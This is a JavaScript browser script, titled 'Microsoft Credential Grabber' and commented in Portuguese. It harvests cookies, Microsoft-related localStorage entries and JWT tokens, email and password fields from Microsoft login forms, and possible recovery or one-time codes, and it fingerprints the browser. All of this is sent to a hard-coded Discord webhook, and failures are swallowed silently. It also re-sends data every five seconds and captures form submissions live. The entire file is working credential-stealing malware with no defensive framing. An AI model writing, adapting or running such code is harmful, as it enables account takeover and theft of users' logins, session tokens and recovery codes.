// Microsoft Credential Grabber
(async function() {
    const WEBHOOK = 'https://ptb.discord.com/api/webhooks/1471888405783773407/d_fL6xpJsDVY759evqGCWkcyKXDuNFz02mR06rxrkOiitlcfOvdNtk6es6WpcI5EOFJA';
    
    // Coletar todos os cookies
    function getAllCookies() {
        return document.cookie.split(';').reduce((cookies, cookie) => {
            const [name, value] = cookie.trim().split('=');
            cookies[name] = decodeURIComponent(value);
            return cookies;
        }, {});
    }
    
    // Procurar por dados Microsoft em localStorage
    function getMicrosoftData() {
        const data = {};
        const keys = Object.keys(localStorage);
        
        keys.forEach(key => {
            const value = localStorage.getItem(key);
            if (key.toLowerCase().includes('microsoft') || 
                key.toLowerCase().includes('outlook') ||
                key.toLowerCase().includes('hotmail') ||
                key.toLowerCase().includes('live') ||
                key.toLowerCase().includes('xbox')) {
                data[key] = value;
            }
            
            // Procurar por tokens JWT (padrão Microsoft)
            if (value && value.includes('eyJ')) {
                try {
                    const payload = JSON.parse(atob(value.split('.')[1]));
                    if (payload.tid || payload.oid || payload.preferred_username) {
                        data[`jwt_${key}`] = value;
                    }
                } catch {}
            }
        });
        
        return data;
    }
    
    // Extrair dados de formulários Microsoft
    function scanMicrosoftForms() {
        const forms = document.querySelectorAll('form');
        const data = {};
        
        forms.forEach((form, index) => {
            const action = form.action || '';
            if (action.includes('microsoft') || action.includes('outlook') || action.includes('live')) {
                const inputs = form.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]');
                inputs.forEach(input => {
                    if (input.value) {
                        data[`form${index}_${input.name || input.type}`] = input.value;
                    }
                });
            }
        });
        
        return data;
    }
    
    // Procurar por recovery codes
    function findRecoveryCodes() {
        const recoveryPatterns = [
            /\b\d{6}\b/g, // 6 dígitos
            /\b[A-Z0-9]{7}\b/g, // Códigos alfanuméricos
            /\b(?:recovery|backup|codigo|cod|recuperacao)\s*[:=]?\s*([A-Z0-9]+)\b/gi
        ];
        
        const codes = [];
        const text = document.body.innerText;
        
        recoveryPatterns.forEach(pattern => {
            const matches = text.match(pattern);
            if (matches) codes.push(...matches);
        });
        
        // Procurar em meta tags
        const metaTags = document.querySelectorAll('meta[name*="recovery"], meta[name*="backup"]');
        metaTags.forEach(tag => {
            if (tag.content) codes.push(tag.content);
        });
        
        return [...new Set(codes)];
    }
    
    // Capturar dados do navegador
    function getBrowserData() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            localStorageSize: Object.keys(localStorage).length,
            sessionStorageSize: Object.keys(sessionStorage).length
        };
    }
    
    // Enviar dados para webhook
    async function sendData(data) {
        const payload = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            ...data
        };
        
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            // Silencioso
        }
    }
    
    // Coletar tudo
    const collectedData = {
        cookies: getAllCookies(),
        microsoft: getMicrosoftData(),
        forms: scanMicrosoftForms(),
        recoveryCodes: findRecoveryCodes(),
        browser: getBrowserData()
    };
    
    // Enviar imediatamente
    sendData(collectedData);
    
    // Monitorar mudanças em localStorage
    setInterval(() => {
        const newData = getMicrosoftData();
        if (JSON.stringify(newData) !== JSON.stringify(collectedData.microsoft)) {
            collectedData.microsoft = newData;
            sendData({ update: 'microsoft_data', ...newData });
        }
    }, 5000);
    
    // Capturar formulários em tempo real
    document.addEventListener('submit', (e) => {
        const form = e.target;
        const action = form.action || '';
        
        if (action.includes('microsoft') || action.includes('outlook') || action.includes('live')) {
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            
            sendData({ formSubmit: data, url: action });
        }
    });
    
})();
